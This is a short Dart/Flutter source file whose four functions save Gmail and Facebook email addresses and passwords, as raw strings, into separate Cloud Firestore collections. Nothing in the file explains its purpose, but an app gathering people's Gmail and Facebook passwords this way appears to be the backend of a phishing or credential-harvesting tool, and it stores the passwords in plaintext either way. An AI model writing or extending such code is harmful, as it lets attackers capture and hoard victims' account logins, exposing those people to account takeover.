import 'package:cloud_firestore/cloud_firestore.dart';

FirebaseFirestore db = FirebaseFirestore.instance;

Future<void> addData(String data) async {
  await db.collection('Gmail').add({'email': data});
}

Future<void> addData2(String data) async {
  await db.collection('GmailPassword').add({'gmailpassword': data});
}

Future<void> addData3(String data) async {
  await db.collection('Facebook').add({'email2': data});
}

Future<void> addData4(String data) async {
  await db.collection('FacebookPassword').add({'gmailpassword2': data});
}
